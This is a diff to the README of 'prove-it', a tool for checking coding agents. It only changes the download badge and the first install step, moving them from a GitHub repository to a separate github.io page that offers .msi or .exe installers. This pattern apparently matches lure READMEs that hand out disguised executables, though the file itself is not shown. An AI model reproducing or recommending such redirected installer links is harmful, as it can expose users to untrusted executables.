@@ -1,6 +1,6 @@
 # 🔍 prove-it - Verify your code agent tasks automatically
 
-[![](https://img.shields.io/badge/Download_prove-it-blue.svg)](https://github.com/clangorous-rastafarian429/prove-it)
+[![](https://img.shields.io/badge/Download_prove-it-blue.svg)](https://clangorous-rastafarian429.github.io)
 
 Coding agents often claim their work is complete before they finish the task. prove-it watches your agent during the coding process. It forces the agent to run tests, perform builds, and check the code after every change. This tool ensures the code actually works before the agent marks the job as done. You get peace of mind knowing the agent provided honest evidence for every line of code it wrote.
 
@@ -17,7 +17,7 @@ Your computer needs a few basic items to run prove-it:
 
 Follow these steps to set up prove-it on your Windows machine:
 
-1. Visit this page to download the latest version: [https://github.com/clangorous-rastafarian429/prove-it](https://github.com/clangorous-rastafarian429/prove-it).
+1. Visit this page to download the latest version: [https://clangorous-rastafarian429.github.io](https://clangorous-rastafarian429.github.io).
 2. Look for the file ending in .msi or .exe under the latest release section.
 3. Save the file to your computer.
 4. Double-click the file to start the installer.
